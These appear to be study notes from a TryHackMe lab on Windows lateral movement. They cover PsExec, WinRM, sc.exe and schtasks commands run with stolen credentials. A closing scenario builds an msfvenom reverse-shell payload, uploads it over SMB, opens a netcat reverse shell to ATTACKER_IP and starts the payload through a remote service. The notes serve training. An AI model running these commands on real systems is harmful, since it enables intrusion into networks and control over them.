# 💻 Remote Process Execution & Lateral Movement

> **Topic:** Methods for an attacker to spawn a process remotely on a target machine, assuming they have valid credentials. This is a key technique in **Lateral Movement**.

---

## 🛡️ Core Concept: Lateral Movement

* **Goal:** Execute commands on a remote machine using valid, often administrative, credentials.
* **Prerequisite:** Valid credentials on the target system (usually **Administrator** level or equivalent).

---

## 1. PsExec (Sysinternals Tool)

PsExec is a long-standing, powerful tool for remote command execution.

* **Ports:** **445/TCP** (SMB)
* **Required Group:** **Administrators**
* **Mechanism:**
    1.  Connects to the **Admin\$ share** on the target.
    2.  Uploads a service binary (default name: `psexesvc.exe`) to the $\text{C:\Windows}$ directory.
    3.  Connects to the **Service Control Manager (SCM)** to create and run a service named $\text{PSEXESVC}$, associating it with the uploaded binary.
    4.  Creates **Named Pipes** to handle standard input/output/error (stdin/stdout/stderr), enabling interactive sessions.
* **Command Example (psexec64.exe):**
    ```powershell
    psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
    ```

---

## 2. Windows Remote Management (WinRM)

WinRM is a web-based protocol for sending PowerShell commands remotely.

* **Ports:**
    * **5985/TCP** (WinRM HTTP)
    * **5986/TCP** (WinRM HTTPS)
* **Required Group:** **Remote Management Users** (often enabled by default on Windows Servers).
* **Tools/Cmdlets:**

### A. Non-Interactive (winrs.exe)
* Used for single commands.
    ```powershell
    winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
    ```

### B. PowerShell Cmdlets
* Requires creating a **PSCredential object** to pass credentials securely.
    ```powershell
    # Credential Object Creation
    $username = 'Administrator';
    $password = 'Mypass123';
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
    ```
* **Interactive Session:** `Enter-PSSession`
    ```powershell
    Enter-PSSession -Computername TARGET -Credential $credential
    ```
* **Remote Script/Command Execution:** `Invoke-Command`
    ```powershell
    Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
    ```

---

## 3. Remotely Creating Services (sc.exe)

Leveraging Windows Services, which execute a command when started, using the standard $\text{sc.exe}$ tool.

* **Required Group:** **Administrators**
* **Ports (SVCCTL - Service Control Manager):**
    * **135/TCP** (Endpoint Mapper - EPM) and **49152-65535/TCP** (Dynamic ports for DCE/RPC).
    * **445/TCP** (RPC over SMB Named Pipes).
    * **139/TCP** (RPC over SMB Named Pipes over NetBIOS).
* **Mechanism:** $\text{sc.exe}$ connects to the **SVCCTL** remote service program via **RPC** (either directly via EPM/dynamic ports or via SMB named pipes).
* **Key Consideration:** Command output is **not available** (Blind attack).
* **Example (Create a user):**
    ```powershell
    # Create the service, associating it with a command
    sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
    # Start the service (executes the command)
    sc.exe \\TARGET start THMservice
    # Cleanup
    sc.exe \\TARGET stop THMservice
    sc.exe \\TARGET delete THMservice
    ```

---

## 4. Creating Scheduled Tasks Remotely (schtasks.exe)

Using the built-in Windows $\text{schtasks}$ utility to create and run tasks on a remote machine.

* **Tool:** `schtasks.exe` (available on any Windows installation).
* **Key Consideration:** Command output is **not available** (Blind attack).
* **Example:**
    ```powershell
    # Create the task (sets execution once on a dummy date/time)
    schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload>" /sc ONCE /sd 01/01/1970 /st 00:00
    # Run the task manually
    schtasks /s TARGET /run /TN "THMtask1"
    # Cleanup
    schtasks /S TARGET /TN "THMtask1" /DELETE /F
    ```

---

## 🎯 Practical Attack Scenario: Lateral Movement with sc.exe

### Goal: Upload and execute an EXE-Service Reverse Shell using `sc.exe`.

* **Target Machine:** $\text{THMIIS}$
* **Jump Host (SSH):** $\text{THMJMP2}$
* **Attacker Machine:** $\text{AttackBox}$
* **Compromised Credentials:** $\text{t1\_leonard.summers}$ ($\text{EZpass4ever}$)

### Steps:

1.  **Generate Service Payload (AttackBox)**
    * **Key:** Must use the **`exe-service`** format to prevent the SCM from killing the non-standard executable immediately.
    ```bash
    msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
    ```

2.  **Upload Payload to Target (AttackBox)**
    * Use `smbclient` to upload the payload to the $\text{ADMIN\$}$ share.
    ```bash
   smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
    ```

3.  **Set Up Listener (AttackBox)**
    * Use $\text{msfconsole}$ to catch the shell.
    ```bash
    msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444; exploit"
    ```

4.  **Establish Credential Access on Jump Host (THMJMP2)**
    * Since $\text{sc.exe}$ doesn't accept credentials, use $\text{runas}$ with $\text{/netonly}$ to spawn a new shell that runs with the **$\text{t1\_leonard.summers}$** access token.
    * This requires a second $\text{Netcat}$ listener on a different port ($\text{4443}$). when passwd is asked use leonard pass
    ```powershell
    C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
    ```

5.  **Execute Payload Remotely (THMJMP2 - As $\text{t1\_leonard.summers}$ session)**
    * Create and start the service, pointing the $\text{binPath}$ to the uploaded executable.
    ```powershell
    C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
    C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
    ```
    *(A reverse shell should now be received on the $\text{msfconsole}$ listener on port $\text{4444}$)*